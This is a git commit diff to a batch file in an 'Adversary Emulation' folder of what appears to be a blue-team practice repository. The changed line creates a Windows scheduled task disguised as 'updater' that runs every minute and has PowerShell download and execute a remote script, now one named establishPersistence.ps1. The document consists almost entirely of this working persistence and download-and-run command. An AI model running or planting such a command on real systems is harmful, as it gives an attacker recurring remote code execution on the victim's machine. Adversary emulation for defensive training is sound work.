fee24975e14747002e884cc43658355be82c58c4
ZeroDayZealot <95112988+LeMagicKonch@users.noreply.github.com>
2025-08-28 13:08:12 -0700

    Update taskSchedular.bat

--- Adversary Emulation/taskSchedular.bat
+++ Adversary Emulation/taskSchedular.bat
@@ -1,1 +1,2 @@
-schtasks /CREATE /SC MINUTE /TN updater /TR "powershell.exe -c iex (iwr -uri https://github.com/LeMagicKonch/BlueTeamOps/raw/refs/heads/main/Adversary%20Emulation/vmchecker.bat -UseBasicParsing).Content"
+schtasks /CREATE /SC MINUTE /TN updater /TR "powershell.exe -c iex (iwr -uri https://github.com/LeMagicKonch/BlueTeamOps/raw/refs/heads/main/Adversary%20Emulation/establishPersistence.ps1 -UseBasicParsing).Content"
+
